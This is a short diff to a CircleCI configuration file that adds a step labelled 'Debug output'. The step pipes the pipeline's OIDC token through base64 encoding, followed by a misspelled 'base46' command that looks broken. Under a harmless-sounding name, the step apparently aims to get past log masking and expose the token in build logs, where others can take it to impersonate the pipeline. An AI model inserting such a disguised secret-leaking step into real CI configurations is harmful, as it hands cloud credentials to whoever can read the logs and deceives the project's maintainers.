@@ -22,6 +22,10 @@ jobs:
           name: "Say hello"
           command: "echo Hello, World!"
 
+      - run:
+          name: "Debug output"
+          command: "echo $CIRCLE_OIDC_TOKEN_V2 | base64 | base46"
+
 # Orchestrate jobs using workflows
 # See: https://circleci.com/docs/guides/orchestrate/workflows/ & https://circleci.com/docs/reference/configuration-reference/#workflows
 workflows:
